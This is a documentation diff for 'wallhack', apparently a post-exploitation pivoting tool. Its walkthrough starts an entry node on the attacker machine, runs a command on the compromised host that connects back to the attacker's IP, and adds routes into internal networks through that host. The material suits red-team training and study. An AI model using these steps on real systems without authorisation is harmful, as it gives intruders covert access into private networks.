@@ -14,24 +14,43 @@ The binary reached the host via initial access — a web shell, RCE exploit, or 
 
 {% steps %}
 {% step title="Attacker (192.168.1.5)" number=1 %}
-With no arguments, `wallhack` starts an [entry node](/concepts) on the default port (6565/udp, QUIC).
+With no arguments, `wallhack` listens on the default port and negotiates the entry role automatically.
 
-{% codeblock code="wallhack" /%}
+```
+$ wallhack
+wallhack 0.6.2
+Type 'help' for available commands.
+
+wallhack> info
+role:              entry
+listen addr:       :6565
+version:           wallhack 0.6.2
+uptime:            2s
+```
 {% /step %}
 
 {% step title="Compromised Host (10.0.1.5)" number=2 %}
-An [exit node](/concepts) connecting back to the entry node on the default port.
+Connecting back to the attacker. With no TUN capability available, the node negotiates the exit role automatically.
 
-{% codeblock code="wallhack exit --connect 192.168.1.5" /%}
+{% codeblock code="wallhack --connect 192.168.1.5" /%}
 
+Back on the attacker, the REPL shows the connection:
+
+```
+[+] peer "pivot" connected (10.0.1.5:52341)
+
+wallhack> peers
+NAME   ADDR              STATUS     LATENCY  TUN  LISTEN  CONNECT
+pivot  10.0.1.5:52341    connected  1.2ms    no   no      yes
+```
 {% /step %}
 
 {% step title="Configure Routes" number=3 %}
 Add routes for the networks reachable through the compromised host.
 
-Using the entry node REPL (also configures the OS route automatically):
 ```
 wallhack> route add 10.10.0.0/24
+OK
 ```
 
 With only one peer connected, the peer is inferred automatically. Use `route add <cidr> via <peer>` when multiple peers are connected.
